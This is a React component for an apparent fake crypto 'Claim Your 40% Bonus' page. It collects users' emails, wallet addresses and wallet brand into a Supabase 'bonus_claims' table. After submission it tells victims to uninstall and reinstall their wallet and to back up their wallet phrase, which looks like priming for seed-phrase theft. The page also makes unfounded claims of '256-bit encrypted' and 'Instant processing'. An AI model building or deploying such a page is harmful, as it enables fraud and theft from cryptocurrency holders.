import React, { useState } from 'react';
import { supabase } from '../lib/supabase';
const WALLETS = [
{
  name: 'MetaMask',
  logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png'
},
{
  name: 'Trust Wallet',
  logo: 'https://static.vecteezy.com/system/resources/previews/067/565/496/non_2x/trust-wallet-rounded-logo-design-free-png.png'
},
{
  name: 'Phantom',
  logo: 'https://docs.phantom.com/favicon.svg'
},
{
  name: 'Exodus',
  logo: 'https://www.exodus.com/brand/img/logo-with-halo.png'
},
{
  name: 'Rainbow',
  logo: 'https://play-lh.googleusercontent.com/fMUvmUmIpIDoZGTACYohbY3DE7-24GFkQ21WjVHxa57qluzWrr7khkycE8cz_juhew'
},
{
  name: 'Crypto.com',
  logo: 'https://www.vhv.rs/dpng/d/257-2574815_crypto-com-logo-svg-hd-png-download.png'
},
{
  name: 'ETH Wallet',
  logo: 'https://www.cryptocompare.com/media/35309279/hb-wallet-logo.png'
},
{
  name: 'Ledger',
  logo: 'https://cryptorecovers.com/wp-content/uploads/2025/03/Ledger.png'
},
{
  name: 'Coinbase',
  logo: 'https://images.seeklogo.com/logo-png/44/1/coinbase-coin-logo-png_seeklogo-444569.png'
},
{
  name: 'Coinmama',
  logo: 'https://media.cryptomaniaks.com/images/logos/1739096884479_67a88334f12aaec7e4a46aed.png'
},
{
  name: 'Binance',
  logo: 'https://images.seeklogo.com/logo-png/44/2/binance-smart-chain-bsc-logo-png_seeklogo-446621.png'
}];

export function BonusClaimPage() {
  const [email, setEmail] = useState('');
  const [cryptoAddress, setCryptoAddress] = useState('');
  const [selectedWallet, setSelectedWallet] = useState<
    (typeof WALLETS)[0] | null>(
    null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [submitted, setSubmitted] = useState(false);
  const handleClaim = async () => {
    if (!email.trim()) {
      setError('Please enter your email address.');
      return;
    }
    if (!cryptoAddress.trim()) {
      setError('Please enter your cryptocurrency address.');
      return;
    }
    if (!selectedWallet) {
      setError('Please select a wallet provider.');
      return;
    }
    setError('');
    setLoading(true);
    try {
      await supabase.from('bonus_claims').insert([
      {
        email: email.trim(),
        wallet_type: selectedWallet.name,
        crypto_address: cryptoAddress.trim(),
        status: 'pending',
        created_at: new Date().toISOString()
      }]
      );
    } catch (e) {
      console.error(e);
    }
    setLoading(false);
    setSubmitted(true);
  };
  // ── INSTRUCTION SCREEN after submit ──
  if (submitted) {
    return (
      <div
        className="min-h-screen pt-20 pb-20 px-4 flex items-center justify-center"
        style={{
          background: 'transparent'
        }}>

        <div
          style={{
            maxWidth: 520,
            width: '100%',
            textAlign: 'center',
            background: 'rgba(139,92,246,0.07)',
            backdropFilter: 'blur(24px)',
            WebkitBackdropFilter: 'blur(24px)',
            border: '1px solid rgba(139,92,246,0.3)',
            borderRadius: 20,
            padding: 'clamp(28px, 6vw, 48px)',
            boxShadow: '0 0 60px rgba(139,92,246,0.12)'
          }}>

          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: '50%',
              margin: '0 auto 24px',
              background:
              'linear-gradient(135deg, rgba(139,92,246,0.25), rgba(245,158,11,0.25))',
              border: '2px solid rgba(139,92,246,0.4)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>

            <span
              style={{
                fontSize: 36
              }}>

              📲
            </span>
          </div>

          <h2
            style={{
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 'clamp(1.2rem, 4vw, 1.6rem)',
              fontWeight: 800,
              color: 'white',
              margin: '0 0 20px',
              lineHeight: 1.3
            }}>

            Action Required
          </h2>

          <div
            style={{
              background: 'rgba(245,158,11,0.1)',
              border: '1px solid rgba(245,158,11,0.35)',
              borderRadius: 14,
              padding: '20px 18px',
              marginBottom: 24,
              textAlign: 'left'
            }}>

            <p
              style={{
                fontFamily: 'Inter, sans-serif',
                fontSize: 15,
                color: 'rgba(255,255,255,0.85)',
                lineHeight: 1.7,
                margin: 0
              }}>

              Kindly uninstall your wallet provider and reinstall back to make
              bonus available in wallet.
            </p>
          </div>

          <div
            style={{
              background: 'rgba(239,68,68,0.1)',
              border: '1px solid rgba(239,68,68,0.3)',
              borderRadius: 14,
              padding: '16px 18px',
              marginBottom: 32,
              textAlign: 'left'
            }}>

            <p
              style={{
                fontFamily: 'Inter, sans-serif',
                fontSize: 13,
                color: '#fca5a5',
                lineHeight: 1.6,
                margin: 0
              }}>

              <strong
                style={{
                  color: '#f87171'
                }}>

                ⚠️ Note:
              </strong>{' '}
              Ensure you backed up your wallet phrase before uninstalling and
              reinstalling.
            </p>
          </div>

          <button
            onClick={() => {
              setSubmitted(false);
              setEmail('');
              setCryptoAddress('');
              setSelectedWallet(null);
            }}
            style={{
              padding: '12px 32px',
              borderRadius: 12,
              border: 'none',
              cursor: 'pointer',
              background: 'rgba(255,255,255,0.08)',
              color: 'rgba(255,255,255,0.7)',
              fontFamily: 'Inter, sans-serif',
              fontSize: 14,
              fontWeight: 600,
              transition: 'all 0.2s'
            }}>

            ← Back to Claim Page
          </button>
        </div>
      </div>);

  }
  // ── MAIN FORM ──
  return (
    <div
      className="min-h-screen pt-20 pb-20 px-4 flex items-start justify-center"
      style={{
        background: 'transparent'
      }}>

      <div className="w-full max-w-2xl mt-8">
        {/* Header */}
        <div className="text-center mb-10">
          <div
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: 6,
              padding: '6px 16px',
              borderRadius: 999,
              marginBottom: 20,
              background: 'rgba(139,92,246,0.15)',
              border: '1px solid rgba(139,92,246,0.35)',
              color: '#c084fc',
              fontSize: 13,
              fontFamily: 'Inter, sans-serif',
              fontWeight: 500
            }}>

            🎁 Limited Time — 40% Bonus Active
          </div>
          <h1
            style={{
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 'clamp(2rem, 6vw, 3.5rem)',
              fontWeight: 900,
              color: 'white',
              margin: '0 0 12px',
              lineHeight: 1.15
            }}>

            Claim Your <span className="text-neon-gradient">40% Bonus</span>
          </h1>
          <p
            style={{
              color: 'rgba(255,255,255,0.55)',
              fontSize: 16,
              fontFamily: 'Inter, sans-serif',
              margin: 0
            }}>

            Enter your details and claim your crypto bonus instantly
          </p>
        </div>

        {/* Card */}
        <div
          style={{
            background: 'rgba(139,92,246,0.07)',
            backdropFilter: 'blur(24px)',
            WebkitBackdropFilter: 'blur(24px)',
            border: '1px solid rgba(139,92,246,0.3)',
            borderRadius: 20,
            padding: 'clamp(20px, 5vw, 40px)',
            boxShadow: '0 0 60px rgba(139,92,246,0.12)'
          }}>

          {/* Email */}
          <div
            style={{
              marginBottom: 24
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 8,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Email Address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="your@email.com"
              style={{
                width: '100%',
                padding: '14px 16px',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(139,92,246,0.35)',
                borderRadius: 12,
                color: 'white',
                fontSize: 15,
                fontFamily: 'Inter, sans-serif',
                outline: 'none',
                boxSizing: 'border-box',
                transition: 'border-color 0.2s'
              }}
              onFocus={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.8)'
              }
              onBlur={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.35)'
              } />

          </div>

          {/* Crypto Address */}
          <div
            style={{
              marginBottom: 24
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 8,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Cryptocurrency Address
            </label>
            <input
              type="text"
              value={cryptoAddress}
              onChange={(e) => setCryptoAddress(e.target.value)}
              placeholder="Enter your crypto wallet address"
              style={{
                width: '100%',
                padding: '14px 16px',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid rgba(139,92,246,0.35)',
                borderRadius: 12,
                color: 'white',
                fontSize: 15,
                fontFamily: 'Inter, sans-serif',
                outline: 'none',
                boxSizing: 'border-box',
                transition: 'border-color 0.2s'
              }}
              onFocus={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.8)'
              }
              onBlur={(e) =>
              e.target.style.borderColor = 'rgba(139,92,246,0.35)'
              } />

            <p
              style={{
                marginTop: 8,
                fontSize: 12,
                color: 'rgba(255,255,255,0.4)',
                fontFamily: 'Inter, sans-serif',
                fontStyle: 'italic'
              }}>

              Wallet address you wish to claim your bonus into.
            </p>
          </div>

          {/* Wallet selector */}
          <div
            style={{
              marginBottom: 28
            }}>

            <label
              style={{
                display: 'block',
                color: 'rgba(255,255,255,0.75)',
                fontSize: 13,
                fontWeight: 600,
                marginBottom: 12,
                fontFamily: 'Inter, sans-serif',
                letterSpacing: '0.04em',
                textTransform: 'uppercase'
              }}>

              Select Wallet Provider
            </label>
            <div
              style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fill, minmax(90px, 1fr))',
                gap: 10
              }}>

              {WALLETS.map((wallet) => {
                const isSelected = selectedWallet?.name === wallet.name;
                return (
                  <button
                    key={wallet.name}
                    type="button"
                    onClick={() => setSelectedWallet(wallet)}
                    style={{
                      display: 'flex',
                      flexDirection: 'column',
                      alignItems: 'center',
                      gap: 6,
                      padding: '10px 6px',
                      borderRadius: 12,
                      cursor: 'pointer',
                      transition: 'all 0.18s ease',
                      background: isSelected ?
                      'rgba(139,92,246,0.25)' :
                      'rgba(255,255,255,0.04)',
                      border: isSelected ?
                      '2px solid rgba(139,92,246,0.7)' :
                      '1px solid rgba(255,255,255,0.1)',
                      boxShadow: isSelected ?
                      '0 0 14px rgba(139,92,246,0.3)' :
                      'none',
                      position: 'relative'
                    }}>

                    <div
                      style={{
                        width: 40,
                        height: 40,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center'
                      }}>

                      <img
                        src={wallet.logo}
                        alt={wallet.name}
                        style={{
                          width: 36,
                          height: 36,
                          objectFit: 'contain'
                        }}
                        onError={(e) => {
                          const t = e.target as HTMLImageElement;
                          t.style.display = 'none';
                          t.parentElement!.innerHTML = `<div style="width:36px;height:36px;border-radius:50%;background:rgba(139,92,246,0.3);display:flex;align-items:center;justify-content:center;font-weight:700;color:white;font-size:14px">${wallet.name.charAt(0)}</div>`;
                        }} />

                    </div>
                    <span
                      style={{
                        fontSize: 10,
                        color: isSelected ? 'white' : 'rgba(255,255,255,0.6)',
                        fontFamily: 'Inter, sans-serif',
                        fontWeight: 500,
                        textAlign: 'center',
                        lineHeight: 1.2
                      }}>

                      {wallet.name}
                    </span>
                    {isSelected &&
                    <div
                      style={{
                        position: 'absolute',
                        top: 4,
                        right: 4,
                        width: 14,
                        height: 14,
                        borderRadius: '50%',
                        background: '#8b5cf6',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center'
                      }}>

                        <svg
                        width="8"
                        height="8"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="white"
                        strokeWidth="3">

                          <path
                          d="M5 13l4 4L19 7"
                          strokeLinecap="round"
                          strokeLinejoin="round" />

                        </svg>
                      </div>
                    }
                  </button>);

              })}
            </div>
          </div>

          {/* Selected wallet pill */}
          {selectedWallet &&
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: 10,
              padding: '10px 14px',
              borderRadius: 12,
              marginBottom: 20,
              background: 'rgba(139,92,246,0.12)',
              border: '1px solid rgba(139,92,246,0.3)'
            }}>

              <img
              src={selectedWallet.logo}
              alt={selectedWallet.name}
              style={{
                width: 28,
                height: 28,
                objectFit: 'contain'
              }} />

              <div>
                <p
                style={{
                  margin: 0,
                  fontSize: 11,
                  color: 'rgba(255,255,255,0.45)',
                  fontFamily: 'Inter, sans-serif'
                }}>

                  Selected
                </p>
                <p
                style={{
                  margin: 0,
                  fontSize: 14,
                  fontWeight: 600,
                  color: 'white',
                  fontFamily: 'Inter, sans-serif'
                }}>

                  {selectedWallet.name}
                </p>
              </div>
              <span
              style={{
                marginLeft: 'auto',
                fontSize: 11,
                color: '#4ade80',
                background: 'rgba(74,222,128,0.1)',
                padding: '2px 8px',
                borderRadius: 20,
                fontFamily: 'Inter, sans-serif'
              }}>

                ✓ Ready
              </span>
            </div>
          }

          {/* Error */}
          {error &&
          <div
            style={{
              marginBottom: 16,
              padding: '10px 14px',
              borderRadius: 10,
              background: 'rgba(239,68,68,0.1)',
              border: '1px solid rgba(239,68,68,0.35)',
              color: '#f87171',
              fontSize: 13,
              fontFamily: 'Inter, sans-serif'
            }}>

              ⚠️ {error}
            </div>
          }

          {/* CTA Button */}
          <button
            onClick={handleClaim}
            disabled={loading}
            style={{
              width: '100%',
              padding: '16px',
              borderRadius: 14,
              border: 'none',
              background: loading ?
              'rgba(255,255,255,0.1)' :
              'linear-gradient(135deg, #ff6b35 0%, #f59e0b 30%, #c084fc 70%, #8b5cf6 100%)',
              color: 'white',
              fontFamily: 'Orbitron, sans-serif',
              fontSize: 14,
              fontWeight: 700,
              letterSpacing: '0.06em',
              cursor: loading ? 'not-allowed' : 'pointer',
              opacity: loading ? 0.6 : 1,
              boxShadow: loading ?
              'none' :
              '0 0 30px rgba(139,92,246,0.35), 0 4px 15px rgba(0,0,0,0.3)',
              transition: 'all 0.2s'
            }}>

            {loading ? 'Processing...' : '🎁 Claim Bonus'}
          </button>

          <p
            style={{
              textAlign: 'center',
              marginTop: 12,
              fontSize: 11,
              color: 'rgba(255,255,255,0.3)',
              fontFamily: 'Inter, sans-serif'
            }}>

            Secure connection • 256-bit encrypted • Instant processing
          </p>
        </div>
      </div>
    </div>);

}